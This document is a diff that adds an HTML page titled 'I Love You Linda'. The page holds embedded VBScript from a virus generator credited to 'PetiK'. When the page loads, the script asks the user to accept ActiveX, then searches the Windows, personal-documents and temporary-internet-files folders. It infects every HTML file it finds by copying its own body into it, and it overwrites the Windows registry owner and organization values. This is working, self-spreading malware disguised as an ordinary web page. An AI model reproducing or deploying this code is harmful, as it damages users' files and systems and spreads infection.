@@ -1,0 +1,48 @@
+<Linda>
+<coded with tool PSWG 1.0 by PetiK>
+<html><head><title>I Love You Linda</title></head><body>
+<script language=VBScript>
+On Error Resume Next
+MsgBox "Please accept the ActiveX",vbinformation,"Internet"
+Set nbgqlbgr=CreateObject("Scripting.FileSystemObject")
+Set rlwvvvvr=CreateObject("WScript.Shell")
+If err.number=429 Then
+rlwvvvvr.Run javascript:location.reload()
+Else
+
+rlbcgqmb("C:\WINDOWS")
+rlbcgqmb("C:\Eigene Dateien")
+rlbcgqmb("C:\WINDOWS\Temporary Internet Files")
+
+rlwvvvvr.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiKVX"
+rlwvvvvr.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","PetiK Corpor@tion"
+
+End If
+
+Function rlbcgqmb(dir)
+If nbgqlbgr.FolderExists(dir) Then
+  Set bgmbgqlw=nbgqlbgr.GetFolder(dir)
+  Set wvvvvvvv=bgmbgqlw.Files
+  For each vvvvvvvv in wvvvvvvv
+    vwvvvvvv=lcase(nbgqlbgr.GetExtensionName(vvvvvvvv.Name))
+    If vwvvvvvv="htm" or vwvvvvvv="html" Then
+      Set vvvvvvrm=nbgqlbgr.OpenTextFile(vvvvvvvv.path,1 ,False)
+      if vvvvvvrm.ReadLine <> "<Linda>" Then
+        vvvvvvrm.Close()
+        Set vvvvvvrm=nbgqlbgr.OpenTextFile(vvvvvvvv.path,1 ,False)
+        htmorg=vvvvvvrm.ReadAll()
+        vvvvvvrm.Close()
+        Set mbcgqlbg=document.body.createTextRange
+        Set vvvvvvrm=nbgqlbgr.CreateTextFile(vvvvvvvv.path, True, False)
+        vvvvvvrm.WriteLine "<Linda>"
+        vvvvvvrm.Write(htmorg)
+        vvvvvvrm.WriteLine mbcgqlbg.htmltext
+        vvvvvvrm.Close()
+      Else
+        vvvvvvrm.Close()
+      End If
+    End If
+  Next
+End If
+End Function
+</script></body></html>
